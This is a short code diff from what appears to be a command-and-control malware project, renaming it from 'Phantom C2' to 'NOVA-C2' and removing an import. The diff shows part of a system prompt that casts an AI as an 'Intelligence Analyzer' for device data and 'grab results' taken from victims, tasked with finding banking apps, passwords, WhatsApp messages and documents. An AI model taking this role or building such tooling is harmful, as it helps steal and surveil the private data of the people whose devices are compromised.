@@ -1,7 +1,6 @@
-import { aiContext } from './context.js'
 import { callAIWithFallback, parseAIResponse } from './swarm.js'
 
-const ANALYZER_SYSTEM_PROMPT = `You are the Intelligence Analyzer for Phantom C2.
+const ANALYZER_SYSTEM_PROMPT = `You are the Intelligence Analyzer for NOVA-C2.
 
 Your job: Analyze grab results and device data to identify:
 1. High-value data found (banking apps, passwords, WhatsApp messages, documents)
